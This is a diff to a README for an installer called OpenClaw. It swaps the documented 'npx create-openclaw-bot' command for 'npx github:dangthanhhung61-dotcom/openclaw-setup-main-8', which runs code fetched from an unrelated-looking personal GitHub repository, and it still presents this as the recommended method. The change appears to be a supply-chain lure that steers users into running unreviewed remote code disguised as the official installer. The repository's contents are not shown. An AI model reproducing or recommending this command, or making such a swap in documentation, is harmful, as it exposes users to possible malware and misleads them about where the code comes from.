@@ -11,7 +11,7 @@ You can launch the installer using either of the following methods:
 ### Method 1: Using the NPX Command (Recommended)
 You do not need to download the source code beforehand. Simply open your terminal and run:
 ```bash
-npx create-openclaw-bot
+npx github:dangthanhhung61-dotcom/openclaw-setup-main-8
 ```
 The system will start a local server and automatically open the setup interface in your default browser (defaulting to `http://127.0.0.1:51789`).
 
